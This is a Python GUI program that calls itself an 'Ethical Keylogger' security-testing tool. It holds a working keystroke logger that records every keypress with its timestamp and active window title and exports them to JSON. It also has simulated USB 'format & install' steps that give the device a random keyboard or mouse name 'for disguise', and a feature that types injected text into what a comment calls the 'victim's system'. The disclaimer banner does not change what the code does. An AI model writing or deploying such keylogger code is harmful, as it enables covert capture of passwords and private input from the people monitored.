import tkinter as tk
from tkinter import ttk, messagebox, filedialog
import threading
import time
import json
import os
import random
from datetime import datetime
import pyautogui
import pynput
from pynput import keyboard, mouse
import psutil
import platform

class EthicalKeyloggerGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Ethical Keylogger - Security Testing Tool")
        self.root.geometry("1000x700")
        self.root.configure(bg='#1e1e1e')
        
        # Variables
        self.is_logging = False
        self.is_formatting = False
        self.connected_devices = []
        self.keystroke_data = []
        self.current_app = "Unknown"
        self.device_names = [
            "Logitech G102 Gaming Mouse",
            "Realtek USB Keyboard",
            "Microsoft Wired Keyboard 600",
            "Corsair K70 RGB MK.2",
            "Razer BlackWidow Elite",
            "SteelSeries Apex Pro",
            "HyperX Alloy FPS Pro",
            "ASUS ROG Strix Flare",
            "Cooler Master MK750",
            "Ducky One 2 Mini"
        ]
        
        # Create GUI
        self.create_widgets()
        self.update_device_list()
        
        # Start monitoring thread
        self.monitoring_thread = threading.Thread(target=self.monitor_active_window, daemon=True)
        self.monitoring_thread.start()
        
    def create_widgets(self):
        # Header
        header_frame = tk.Frame(self.root, bg='#2d2d2d', height=60)
        header_frame.pack(fill='x', padx=10, pady=5)
        header_frame.pack_propagate(False)
        
        title_label = tk.Label(header_frame, text="Ethical Keylogger - Security Testing Suite", 
                              font=('Arial', 16, 'bold'), bg='#2d2d2d', fg='#00ff00')
        title_label.pack(pady=15)
        
        # Main content frame
        main_frame = tk.Frame(self.root, bg='#1e1e1e')
        main_frame.pack(fill='both', expand=True, padx=10, pady=5)
        
        # Left panel - Device Management
        left_frame = tk.LabelFrame(main_frame, text="Device Management", bg='#2d2d2d', 
                                  fg='#ffffff', font=('Arial', 12, 'bold'))
        left_frame.pack(side='left', fill='y', padx=(0, 5), pady=5)
        
        # Device list
        device_label = tk.Label(left_frame, text="Connected Devices:", bg='#2d2d2d', fg='#ffffff')
        device_label.pack(pady=5)
        
        self.device_listbox = tk.Listbox(left_frame, width=40, height=10, bg='#3d3d3d', fg='#ffffff')
        self.device_listbox.pack(pady=5, padx=10)
        
        # Refresh button
        refresh_btn = tk.Button(left_frame, text="Refresh Devices", command=self.update_device_list,
                               bg='#4CAF50', fg='white', font=('Arial', 10))
        refresh_btn.pack(pady=5)
        
        # Format button
        self.format_btn = tk.Button(left_frame, text="Format & Install", command=self.format_device,
                                   bg='#FF9800', fg='white', font=('Arial', 10))
        self.format_btn.pack(pady=5)
        
        # Current device info
        self.device_info = tk.Label(left_frame, text="Current Device: None", 
                                   bg='#2d2d2d', fg='#00ff00', font=('Arial', 10))
        self.device_info.pack(pady=10)
        
        # Right panel - Keylogger Control
        right_frame = tk.Frame(main_frame, bg='#1e1e1e')
        right_frame.pack(side='right', fill='both', expand=True, pady=5)
        
        # Control panel
        control_frame = tk.LabelFrame(right_frame, text="Keylogger Control", bg='#2d2d2d', 
                                     fg='#ffffff', font=('Arial', 12, 'bold'))
        control_frame.pack(fill='x', padx=5, pady=5)
        
        # Start/Stop buttons
        btn_frame = tk.Frame(control_frame, bg='#2d2d2d')
        btn_frame.pack(pady=10)
        
        self.start_btn = tk.Button(btn_frame, text="Start Logging", command=self.start_logging,
                                  bg='#4CAF50', fg='white', font=('Arial', 10), width=15)
        self.start_btn.pack(side='left', padx=5)
        
        self.stop_btn = tk.Button(btn_frame, text="Stop Logging", command=self.stop_logging,
                                 bg='#f44336', fg='white', font=('Arial', 10), width=15, state='disabled')
        self.stop_btn.pack(side='left', padx=5)
        
        # Status
        self.status_label = tk.Label(control_frame, text="Status: Ready", bg='#2d2d2d', 
                                    fg='#ffff00', font=('Arial', 10))
        self.status_label.pack(pady=5)
        
        # Current application tracking
        app_frame = tk.LabelFrame(control_frame, text="Current Application", bg='#2d2d2d', 
                                 fg='#ffffff', font=('Arial', 10))
        app_frame.pack(fill='x', padx=10, pady=5)
        
        self.app_label = tk.Label(app_frame, text="Active App: Unknown", bg='#2d2d2d', 
                                 fg='#00ff00', font=('Arial', 10))
        self.app_label.pack(pady=5)
        
        # Keystroke display
        keystroke_frame = tk.LabelFrame(right_frame, text="Keystroke Data", bg='#2d2d2d', 
                                       fg='#ffffff', font=('Arial', 12, 'bold'))
        keystroke_frame.pack(fill='both', expand=True, padx=5, pady=5)
        
        # Text area with scrollbar
        text_frame = tk.Frame(keystroke_frame, bg='#2d2d2d')
        text_frame.pack(fill='both', expand=True, padx=10, pady=5)
        
        self.keystroke_text = tk.Text(text_frame, bg='#3d3d3d', fg='#ffffff', 
                                     font=('Consolas', 10), wrap='word')
        scrollbar = tk.Scrollbar(text_frame, orient='vertical', command=self.keystroke_text.yview)
        self.keystroke_text.configure(yscrollcommand=scrollbar.set)
        
        self.keystroke_text.pack(side='left', fill='both', expand=True)
        scrollbar.pack(side='right', fill='y')
        
        # Clear button
        clear_btn = tk.Button(keystroke_frame, text="Clear Data", command=self.clear_data,
                             bg='#607D8B', fg='white', font=('Arial', 10))
        clear_btn.pack(pady=5)
        
        # Export button
        export_btn = tk.Button(keystroke_frame, text="Export Data", command=self.export_data,
                              bg='#2196F3', fg='white', font=('Arial', 10))
        export_btn.pack(pady=5)
        
        # HID Control (2-way communication)
        hid_frame = tk.LabelFrame(right_frame, text="HID Control", bg='#2d2d2d', 
                                 fg='#ffffff', font=('Arial', 12, 'bold'))
        hid_frame.pack(fill='x', padx=5, pady=5)
        
        self.hid_entry = tk.Entry(hid_frame, bg='#3d3d3d', fg='#ffffff', font=('Arial', 10), width=30)
        self.hid_entry.pack(side='left', padx=10, pady=10)
        
        send_btn = tk.Button(hid_frame, text="Send Input", command=self.send_hid_input,
                            bg='#9C27B0', fg='white', font=('Arial', 10))
        send_btn.pack(side='left', padx=5)
        
        # Disclaimer
        disclaimer = tk.Label(self.root, text="⚠️ FOR AUTHORIZED SECURITY TESTING ONLY ⚠️", 
                             bg='#1e1e1e', fg='#ff0000', font=('Arial', 8))
        disclaimer.pack(side='bottom', pady=5)
    
    def update_device_list(self):
        """Simulate device detection - in real scenario, would detect USB devices"""
        self.device_listbox.delete(0, tk.END)
        self.connected_devices = []
        
        # Simulate finding USB devices
        devices = [
            "/dev/sdb1 - SanDisk USB 3.0 (16GB)",
            "/dev/sdc1 - Kingston DataTraveler (32GB)",
            "/dev/sdd1 - Samsung Flash Drive (64GB)"
        ]
        
        for device in devices:
            self.device_listbox.insert(tk.END, device)
            self.connected_devices.append(device)
    
    def format_device(self):
        """Simulate device formatting and installation"""
        if not self.connected_devices:
            messagebox.showwarning("Warning", "No devices connected!")
            return
            
        selected = self.device_listbox.curselection()
        if not selected:
            messagebox.showwarning("Warning", "Please select a device!")
            return
            
        device = self.connected_devices[selected[0]]
        self.is_formatting = True
        self.status_label.config(text="Status: Formatting device...", fg='#ffff00')
        
        # Simulate formatting process
        def format_process():
            time.sleep(2)  # Simulate formatting time
            # Install keylogger software
            time.sleep(1)
            self.is_formatting = False
            self.status_label.config(text="Status: Device formatted and software installed", fg='#00ff00')
            
            # Change device name for disguise
            new_name = random.choice(self.device_names)
            self.device_info.config(text=f"Current Device: {new_name}")
            
            messagebox.showinfo("Success", f"Device formatted and {new_name} installed successfully!")
        
        threading.Thread(target=format_process, daemon=True).start()
    
    def start_logging(self):
        """Start keylogging"""
        if self.is_logging:
            return
            
        self.is_logging = True
        self.start_btn.config(state='disabled')
        self.stop_btn.config(state='normal')
        self.status_label.config(text="Status: Logging active", fg='#00ff00')
        
        # Start keylogger
        self.keylogger_thread = threading.Thread(target=self.run_keylogger, daemon=True)
        self.keylogger_thread.start()
    
    def stop_logging(self):
        """Stop keylogging"""
        self.is_logging = False
        self.start_btn.config(state='normal')
        self.stop_btn.config(state='disabled')
        self.status_label.config(text="Status: Logging stopped", fg='#ffff00')
    
    def run_keylogger(self):
        """Main keylogger functionality"""
        def on_press(key):
            if not self.is_logging:
                return False
                
            try:
                char = key.char
                if char:
                    timestamp = datetime.now().strftime("%H:%M:%S")
                    data = {
                        'timestamp': timestamp,
                        'app': self.current_app,
                        'key': char,
                        'type': 'keypress'
                    }
                    self.keystroke_data.append(data)
                    self.update_keystroke_display(data)
            except AttributeError:
                # Special keys
                timestamp = datetime.now().strftime("%H:%M:%S")
                data = {
                    'timestamp': timestamp,
                    'app': self.current_app,
                    'key': str(key),
                    'type': 'special'
                }
                self.keystroke_data.append(data)
                self.update_keystroke_display(data)
        
        def on_release(key):
            if not self.is_logging:
                return False
            if key == keyboard.Key.esc:
                return False
        
        # Start listening
        with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
            while self.is_logging:
                time.sleep(0.1)
            listener.stop()
    
    def monitor_active_window(self):
        """Monitor which application is currently active"""
        while True:
            try:
                if platform.system() == "Windows":
                    import win32gui
                    window = win32gui.GetForegroundWindow()
                    app_name = win32gui.GetWindowText(window)
                else:
                    # For Linux/Mac, use psutil
                    for proc in psutil.process_iter(['pid', 'name']):
                        try:
                            if proc.info['pid'] == os.getpid():
                                continue
                        except (psutil.NoSuchProcess, psutil.AccessDenied):
                            pass
                    app_name = "System Process"
                
                if app_name != self.current_app:
                    self.current_app = app_name[:50]  # Limit length
                    self.root.after(0, lambda: self.app_label.config(
                        text=f"Active App: {self.current_app}"))
                
            except Exception as e:
                pass
            time.sleep(1)
    
    def update_keystroke_display(self, data):
        """Update the GUI with new keystroke data"""
        def update():
            display_text = f"[{data['timestamp']}] [{data['app']}] {data['key']}\n"
            self.keystroke_text.insert(tk.END, display_text)
            self.keystroke_text.see(tk.END)
        self.root.after(0, update)
    
    def clear_data(self):
        """Clear all keystroke data"""
        self.keystroke_text.delete(1.0, tk.END)
        self.keystroke_data.clear()
    
    def export_data(self):
        """Export keystroke data to file"""
        if not self.keystroke_data:
            messagebox.showwarning("Warning", "No data to export!")
            return
            
        filename = filedialog.asksaveasfilename(
            defaultextension=".json",
            filetypes=[("JSON files", "*.json"), ("Text files", "*.txt"), ("All files", "*.*")]
        )
        
        if filename:
            try:
                with open(filename, 'w') as f:
                    json.dump(self.keystroke_data, f, indent=2)
                messagebox.showinfo("Success", f"Data exported to {filename}")
            except Exception as e:
                messagebox.showerror("Error", f"Failed to export data: {str(e)}")
    
    def send_hid_input(self):
        """Simulate sending input to victim's system (HID functionality)"""
        input_text = self.hid_entry.get()
        if not input_text:
            messagebox.showwarning("Warning", "Please enter text to send!")
            return
            
        # Simulate typing (in real scenario, this would send actual HID commands)
        def simulate_typing():
            try:
                pyautogui.typewrite(input_text, interval=0.1)
                self.root.after(0, lambda: messagebox.showinfo("Success", "Input sent successfully!"))
            except Exception as e:
                self.root.after(0, lambda: messagebox.showerror("Error", f"Failed to send input: {str(e)}"))
        
        threading.Thread(target=simulate_typing, daemon=True).start()
        self.hid_entry.delete(0, tk.END)

def main():
    root = tk.Tk()
    app = EthicalKeyloggerGUI(root)
    root.mainloop()

if __name__ == "__main__":
    main()